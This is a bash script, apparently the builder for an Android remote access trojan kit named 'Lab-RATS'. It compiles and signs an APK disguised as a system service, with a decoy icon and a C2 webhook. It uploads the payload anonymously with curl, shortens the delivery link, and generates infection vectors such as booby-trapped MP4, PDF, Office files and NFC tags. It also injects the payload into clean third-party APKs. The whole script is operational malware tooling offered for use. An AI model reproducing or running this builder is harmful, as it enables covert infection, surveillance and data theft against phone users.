#!/bin/bash

#################################################
#                   Lab-RATS                    #
#                                               #
#        Android APK BUILDER - Linux/Mac        #
#                v1.6.0 Hardened                #
#                                               #
#             Developed by: K4N3CO              #
#################################################

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Script paths
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
CONFIG_FILE="$SCRIPT_DIR/build_config.txt"

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    echo " ┌───────────────────────────────────────────────────────────────────────┐"
    echo " │                                  .-         .                         │"
    echo " │                               ....-        :                          │"
    echo " │                            -==--+:.+. ..  -..+:-+                     │"
    echo " │                            ++---:+.-==+==#:.+---+#                    │"
    echo " │                             :=---:+++++=++=**-:-:                     │"
    echo " │                               --+++:-=+++++++-=                       │"
    echo " │                  .-.         :--+==:++-:-**+-+-                       │"
    echo " │                    -.     .==:--+:+++=++++++++#.                      │"
    echo " │                    :-    =---=::-++.=:.=.-==+....                     │"
    echo " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │"
    echo " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │"
    echo " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │"
    echo " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │"
    echo " │                .-=:  .---=++++-++++#####*++..::--. .                  │"
    echo " │                 .--++.--:----=+---=-++#++==.       .                  │"
    echo " │                   --------=--:=:-:-====+++-                           │"
    echo " │                       .--++++--++:+++==:=+.                           │"
    echo " │                        .:+++::::--:..:-+=                             │"
    echo " │                       .--=+=-+-+    -:---*---                         │"
    echo " │                                                                       │"
    echo " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │"
    echo " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │"
    echo " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │"
    echo " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │"  
    echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
    echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"                                                                                                          
    echo " │                                                                       │"
    echo " │     ----------> Android APK Builder | v1.6.0 Hardened <----------     │"
    echo " │                                                                       │" 
    echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
    echo " │                         DEVELOPED BY K4N3CO                           │"
    echo " │                               © 2026                                  │"
    echo " └───────────────────────────────────────────────────────────────────────┘"
    echo -e "${NC}"
    echo ""
}

# Detect OS
detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="mac"
    else
        OS="linux" # Fallback
    fi
    unset ANDROID_PREFS_ROOT 2>/dev/null
}

detect_os

# Portable sed in-place
sed_i() {
    if [ "$OS" == "mac" ]; then
        sed -i '' "$@"
    else
        sed -i "$@"
    fi
}

# Check requirements
check_requirements() {
    echo -e "${CYAN}[*] Checking requirements...${NC}"
    detect_os

    # Check Java
    if ! command -v java &> /dev/null; then
        echo -e "${RED}[!] Java is missing. Please install JDK 17 or 21.${NC}"
        return 1
    fi

    JAVA_VER=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2 | cut -d'.' -f1)
    if [ "$JAVA_VER" == "1" ]; then
        JAVA_VER=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2 | cut -d'.' -f2)
    fi

    echo -e "${GREEN}[✓] Java version $JAVA_VER detected${NC}"

    if [ "$JAVA_VER" -gt 21 ]; then
        echo -e "${YELLOW}[!] WARNING: Java $JAVA_VER is very new. Recommended: 17 or 21.${NC}"
    elif [ "$JAVA_VER" -lt 17 ]; then
        echo -e "${YELLOW}[!] WARNING: Java $JAVA_VER is old. Recommended: 17 or 21.${NC}"
    fi

    if ! command -v bc &> /dev/null && ! command -v awk &> /dev/null; then
        echo -e "${RED}[!] Both 'bc' and 'awk' are missing. Please install at least one.${NC}"
        return 1
    fi

    if [ ! -f "$PROJECT_DIR/gradlew" ]; then
        echo -e "${RED}[!] gradlew not found in $PROJECT_DIR${NC}"
        return 1
    fi
    chmod +x "$PROJECT_DIR/gradlew"

    echo -e "${GREEN}[✓] Requirements satisfied${NC}"
}

# Generate keystore
generate_keystore() {
    local AUTO_MODE="$1"
    KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"
    if [ -f "$KEYSTORE_PATH" ] && [ "$AUTO_MODE" == "auto" ]; then return; fi

    if [ -f "$KEYSTORE_PATH" ]; then
        echo -e "${YELLOW}[!] Keystore already exists.${NC}"
        read -p "    Generate new keystore? (y/N): " REGENERATE
        if [[ ! "$REGENERATE" =~ ^[Yy]$ ]]; then return; fi
        rm -f "$KEYSTORE_PATH"
    fi
    
    echo -e "${CYAN}[*] Keystore Configuration${NC}"
    read -p "    Key alias [lab-rats-key]: " ALIAS; ALIAS=${ALIAS:-lab-rats-key}
    read -p "    Password [lab-rats123]: " PASS; PASS=${PASS:-lab-rats123}

    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
    
    cat > "$PROJECT_DIR/keystore.properties" << EOF
storeFile=lab-rats-keystore.jks
storePassword=$PASS
keyAlias=$ALIAS
keyPassword=$PASS
EOF
    echo -e "${GREEN}[✓] Keystore ready${NC}"
}

# Configure app settings
configure_app() {
    echo -e "${CYAN}[*] App Configuration${NC}"
    RAND_V="$((1 + RANDOM % 4)).$((RANDOM % 10)).$((RANDOM % 10))"

    read -p "    Enter App Name [System Stability Service]: " APP_NAME
    APP_NAME=${APP_NAME:-System Stability Service}

    read -p "    Enter Package ID [com.android.system.stability]: " PKG_NAME
    PKG_NAME=${PKG_NAME:-com.android.system.stability}

    read -p "    Enter Version Name [$RAND_V]: " VERSION_NAME
    VERSION_NAME=${VERSION_NAME:-$RAND_V}

    read -p "    Enter Min SDK [21]: " MIN_SDK
    MIN_SDK=${MIN_SDK:-21}

    echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
    echo -e "${YELLOW}    (The app logo will transform into your selection immediately after install on device)${NC}"
    echo "    1. Play Protect (Shield - Default)  2. Calculator"
    echo "    3. Weather                          4. System Update"
    echo "    5. Lab-RATS Logo"
    read -p "    Choice (Default 1): " DECOY_CHOICE
    DECOY_CHOICE=${DECOY_CHOICE:-1}

    BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
    sed_i "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
    sed_i "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
    sed_i "s|minSdk [0-9]*|minSdk $MIN_SDK|g" "$BUILD_GRADLE"
    sed_i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$APP_NAME</string>|g" "$PROJECT_DIR/app/src/main/res/values/strings.xml"
    
    echo "PKG_NAME=\"$PKG_NAME\"" > "$CONFIG_FILE"
    echo "APP_NAME=\"$APP_NAME\"" >> "$CONFIG_FILE"
    echo "VERSION_NAME=\"$VERSION_NAME\"" >> "$CONFIG_FILE"
    echo "MIN_SDK=\"$MIN_SDK\"" >> "$CONFIG_FILE"
    echo "DECOY_CHOICE=\"$DECOY_CHOICE\"" >> "$CONFIG_FILE"

    EXISTING_WEBHOOK=""
    if [ -f "$PROJECT_DIR/local.properties" ]; then
        EXISTING_WEBHOOK=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
    fi

    if [ -n "$EXISTING_WEBHOOK" ]; then
        echo -e "${YELLOW}    Current Webhook URL: $EXISTING_WEBHOOK${NC}"
        read -p "    Enter C2 Webhook URL [Press Enter to Keep Current]: " WEB_URL
        WEB_URL=${WEB_URL:-$EXISTING_WEBHOOK}
    else
        read -p "    Enter C2 Webhook URL (Google Script or Render): " WEB_URL
    fi

    if grep -q "WEBHOOK_URL=" "$PROJECT_DIR/local.properties"; then
        sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
    else
        echo "WEBHOOK_URL=$WEB_URL" >> "$PROJECT_DIR/local.properties"
    fi

    if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
        sed_i "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
    else
        echo "DECOY_CHOICE=$DECOY_CHOICE" >> "$PROJECT_DIR/local.properties"
    fi

    RAND_KEY=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
    if grep -q "ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties"; then
        sed_i "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
    else
        echo "ENCRYPTION_KEY=$RAND_KEY" >> "$PROJECT_DIR/local.properties"
    fi

    mkdir -p "$PROJECT_DIR/app/src/main/assets/sys"
    for i in {1..3}; do
        head -c 512 /dev/urandom > "$PROJECT_DIR/app/src/main/assets/sys/metadata_$i.dat"
    done
}

# Progress bar function
execute_build() {
    local task=$1; local label=$2;
    rm -f build_log.txt
    ./gradlew $task > build_log.txt 2>&1 &
    local pid=$!
    local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local spin_idx=0

    while kill -0 $pid 2>/dev/null; do
        spin_char="${spinner[$spin_idx]}"
        spin_idx=$(( (spin_idx + 1) % 10 ))

        local last_task="Initializing..."
        if [ -f build_log.txt ]; then
            local matched=$(grep "> Task" build_log.txt | tail -n 1 | sed 's/> Task //g' | cut -c1-32)
            if [ -n "$matched" ]; then
                last_task="$matched"
            fi
        fi

        printf "\r\033[K${CYAN}  [*] %-22s ${YELLOW}[${spin_char}] ${WHITE}%-32s${NC}" "$label" "$last_task"
        sleep 0.2
    done

    wait $pid
    local status=$?
    if [ $status -eq 0 ]; then
        printf "\r\033[K${CYAN}  [*] %-22s ${GREEN}[✓] BUILD SUCCESSFUL${NC}\n" "$label"
    else
        printf "\r\033[K${CYAN}  [*] %-22s ${RED}[!] BUILD FAILED${NC}\n" "$label"
        if [ -f build_log.txt ]; then
            echo -e "${RED}[!] Build Log Errors:${NC}"
            grep -iE "error|failed|exception" build_log.txt | tail -n 10
        fi
    fi
    return $status
}

# Build APK
build_apk() {
    print_banner
    echo -e "${CYAN}[*] Initializing Build Engine...${NC}"
    cd "$PROJECT_DIR"
    chmod +x gradlew
    execute_build "assembleRelease" "Compiling Package"
    local BUILD_STATUS=$?
    mkdir -p "$SCRIPT_DIR/output"

    # Locate built APK (release or debug fallback)
    local APK_PATH=""
    if [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
        APK_PATH="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
    elif [ -f "$PROJECT_DIR/app/build/outputs/apk/debug/app-debug.apk" ]; then
        APK_PATH="$PROJECT_DIR/app/build/outputs/apk/debug/app-debug.apk"
    fi

    if [ $BUILD_STATUS -eq 0 ] && [ -n "$APK_PATH" ]; then
        cp "$APK_PATH" "$SCRIPT_DIR/output/signed_v1.apk"
        echo -e "\n${GREEN}[✓] Success: output/signed_v1.apk${NC}"
    else
        echo -e "${RED}[!] Build failed. Error Code: $BUILD_STATUS${NC}"
        BUILD_SUCCESS=1
    fi
    if [ "$BUILD_SUCCESS" == "1" ]; then
        read -p "    Press Enter to return to menu..."
        return 1
    fi
    read -p "    Press Enter to continue..."
}

# Standalone Exploit Generator
generate_exploit_standalone() {
    local TYPE="$1"; local URL="$2"; local EXTRA="$3"
    EXPLOIT_SRC="$PROJECT_DIR/app/src/main/java/com/labs/labrats/exploits/ExploitLab.java"
    TEMP_BIN="$SCRIPT_DIR/bin"; mkdir -p "$TEMP_BIN"
    javac -sourcepath "$PROJECT_DIR/app/src/main/java" -d "$TEMP_BIN" "$EXPLOIT_SRC" 2>build_log.txt
    if [ $? -eq 0 ]; then
        cd "$SCRIPT_DIR/output"
        java -cp "$TEMP_BIN" com.labs.labrats.exploits.ExploitLab "$TYPE" "$URL" "$EXTRA"
        cd "$SCRIPT_DIR"
    else
        echo -e "${RED}[!] Exploit compilation failed. Check build_log.txt${NC}"
    fi
}

# Infection Chain Wizard
infection_wizard() {
    print_banner
    echo -e "${RED}[>] STRATEGIC_INFECTION_WIZARD${NC}"
    echo -e "${YELLOW}    Step-by-step automated payload weaponization.${NC}"
    echo ""
    check_requirements || return
    generate_keystore
    configure_app
    build_apk || return
    local SIGNED_APK="$SCRIPT_DIR/output/signed_v1.apk"
    echo ""
    echo -e "${CYAN}[HOSTING] Select strategy:${NC}"
    echo "    1. Anonymous Cloud (Catbox / Multi-Cloud Fallback)"
    echo "    2. Direct IP (IPv6)"
    echo "    3. Custom / Pre-hosted Direct URL"
    read -p "    Choice: " H
    local DOWNLOAD_URL=""
    if [ "$H" == "2" ]; then
        read -p "    Target IPv6: " IP
        DOWNLOAD_URL="http://[$IP]:9191/download/Update.apk"
    elif [ "$H" == "3" ]; then
        read -p "    Enter pre-hosted URL: " DOWNLOAD_URL
    else
        echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
        DOWNLOAD_URL=$(curl -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php 2>/dev/null)
        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
            echo -e "${YELLOW}[!] Catbox failed/unreachable. Trying Litterbox fallback...${NC}"
            DOWNLOAD_URL=$(curl -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$SIGNED_APK" https://litterbox.catbox.moe/resources/internals/api.php 2>/dev/null)
        fi
        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
            echo -e "${YELLOW}[!] Litterbox failed/unreachable. Trying Tmpfiles.org fallback...${NC}"
            local TMP_RESP=$(curl -sS --connect-timeout 5 --max-time 15 -F "file=@$SIGNED_APK" https://tmpfiles.org/api/v1/upload 2>/dev/null)
            local RAW_TMP=$(echo "$TMP_RESP" | grep -o '"url":"[^"]*' | cut -d'"' -f4)
            if [[ "$RAW_TMP" == *"tmpfiles.org/"* ]]; then
                DOWNLOAD_URL=$(echo "$RAW_TMP" | sed 's/tmpfiles.org\//tmpfiles.org\/dl\//')
            fi
        fi
        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
            echo -e "${RED}[!] Automated cloud uploads failed or unreachable on this network.${NC}"
            read -p "    Enter custom / pre-hosted URL manually: " DOWNLOAD_URL
        fi
        if [ -z "$DOWNLOAD_URL" ] || [[ "$DOWNLOAD_URL" != "http"* ]]; then
            echo -e "${RED}[!] Upload failed / No valid URL provided.${NC}"
            read -p "Press Enter to return..."
            return 1
        fi
        echo -e "${GREEN}[✓] Hosted: $DOWNLOAD_URL${NC}"
        echo -e "${YELLOW}[*] Shortening delivery URL...${NC}"
        SHORT_URL=$(curl -s --connect-timeout 5 "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL" 2>/dev/null)
        if [[ "$SHORT_URL" == "http"* ]]; then
            DOWNLOAD_URL=$SHORT_URL
            echo -e "${GREEN}[✓] Shortened: $DOWNLOAD_URL${NC}"
        fi
    fi
    echo ""
    echo -e "${CYAN}[WEAPONIZE] Select Vector:${NC}"
    echo "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
    echo "    4. Dolby Audio     5. ADB Script    6. Bluetooth Push"
    echo "    7. NFC NDEF Tag    8. Stego Image   9. PWA Bundle"
    echo "    10. Office Word    11. Office Excel 12. Ghost GIF"
    read -p "    Choice: " V
    case $V in
        1) generate_exploit_standalone "mp4" "$DOWNLOAD_URL" ;;
        2) generate_exploit_standalone "pdf" "$DOWNLOAD_URL" "Security_Audit" ;;
        3) generate_exploit_standalone "ics" "$DOWNLOAD_URL" "Security_Sync" ;;
        4) generate_exploit_standalone "dolby" "$DOWNLOAD_URL" ;;
        5) read -p "    Target IP: " TIP; generate_exploit_standalone "adb" "$DOWNLOAD_URL" "$TIP" ;;
        6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "Android Update" ;;
        7) generate_exploit_standalone "ndef" "$DOWNLOAD_URL" "uri" ;;
        8) generate_exploit_standalone "stego" "$DOWNLOAD_URL" ;;
        9) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "SystemUpdate" ;;
        10) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Security_Patch" ;;
        11) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Report" ;;
        12) generate_exploit_standalone "gif" "$DOWNLOAD_URL" ;;
        *) echo -e "${RED}[!] Invalid Choice${NC}" ;;
    esac
    echo -e "\n${GREEN}DEPLOYMENT PACKAGE READY: $DOWNLOAD_URL${NC}"
    read -p "Press Enter to return..."
}

# Exploit Lab Menu
exploit_menu() {
    print_banner
    echo -e "${PURPLE}[>] Weaponized Payload Lab (Hardened Tier)${NC}"
    echo ""
    echo "    1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite"
    echo "    4. Dolby Audio       5. ADB Script      6. Bluetooth Push"
    echo "    7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle"
    echo "    10. Office Word      11. Office Excel   12. Ghost GIF"
    echo "    13. Priv-App Magisk Module ZIP"
    echo "    14. Return to Main Menu"
    echo ""
    read -p "    Choice: " E_CHOICE
    E_CHOICE=${E_CHOICE:-1}
    C2_URL="http://127.0.0.1:8080"
    if [ -f "$PROJECT_DIR/local.properties" ]; then
        WEB_URL=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2)
        if [ -n "$WEB_URL" ]; then C2_URL=$WEB_URL; fi
    fi
    case $E_CHOICE in
        1) generate_exploit_standalone "mp4" "$C2_URL" ;;
        2) read -p "    Enter Title: " T; generate_exploit_standalone "pdf" "$C2_URL" "${T:-URGENT_DOCUMENT}" ;;
        3) read -p "    Enter Summary: " S; generate_exploit_standalone "ics" "$C2_URL" "${S:-Meeting_Invite}" ;;
        4) generate_exploit_standalone "dolby" "$C2_URL" ;;
        5) read -p "    Target IP: " IP; generate_exploit_standalone "adb" "$C2_URL" "$IP" ;;
        6) generate_exploit_standalone "vcf" "$C2_URL" "Android Update" ;;
        7) generate_exploit_standalone "ndef" "$C2_URL" "uri" ;;
        8) generate_exploit_standalone "stego" "$C2_URL" ;;
        9) generate_exploit_standalone "pwa" "$C2_URL" "SystemUpdate" ;;
        10) generate_exploit_standalone "docx" "$C2_URL" "Security_Audit" ;;
        11) generate_exploit_standalone "xlsx" "$C2_URL" "Financial_Report" ;;
        12) generate_exploit_standalone "gif" "$C2_URL" ;;
        13) generate_exploit_standalone "privapp" "$C2_URL" ;;
        14) return ;;
        *) exploit_menu ;;
    esac
    echo ""
    read -p "    Press Enter to return to Lab..."
    exploit_menu
}

# Main menu
main_menu() {
    print_banner
    echo -e "${RED}[>] Build Options:${NC}"
    echo ""
    echo "    1. Start Build (Configure & Build)"
    echo "    2. Generate Keystore Only"
    echo "    3. Configure App Settings Only"
    echo "    4. Check Requirements"
    echo "    5. Weaponized Payload Lab"
    echo "    6. Generate Infection Chain Package (Wizard)"
    echo "    7. Smali Surgery & APK Binder (Infect Clean APK)"
    echo "    8. Help / Documentation"
    echo "    9. Exit"
    echo ""
    read -p "    Choose option (Default 1): " MENU_OPTION
    MENU_OPTION=${MENU_OPTION:-1}
    case $MENU_OPTION in
        1) check_requirements && { generate_keystore; configure_app; build_apk; } ;;
        2) check_requirements && generate_keystore ;;
        3) configure_app ;;
        4) check_requirements; echo ""; read -p "    Press Enter to return..." ;;
        5) exploit_menu ;;
        6) infection_wizard ;;
        7) "$SCRIPT_DIR/bind.sh"; read -p "    Press Enter to return..." ;;
        8) show_help ;;
        9) exit 0 ;;
    esac
}
show_help() {
    print_banner
    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.6.0${NC}"
    echo "------------------------------------------------------------"
    echo "1. Start Build: Standard production flow."
    echo "2. Keystore Only: Unique signing certificate."
    echo "3. App Settings: Change ID, Name, and Version."
    echo "4. Requirements: Check Java setup."
    echo "5. Exploit Lab: Generate standalone tactical vectors."
    echo "6. Infection Wizard: Full Build -> Host -> Weaponize."
    echo "7. Smali Surgery: Inject Lab-RATS payload into clean 3rd-party APK."
    echo "------------------------------------------------------------"
    read -p "Press Enter..."
}
while true; do main_menu; rm -rf "$SCRIPT_DIR/bin"; done
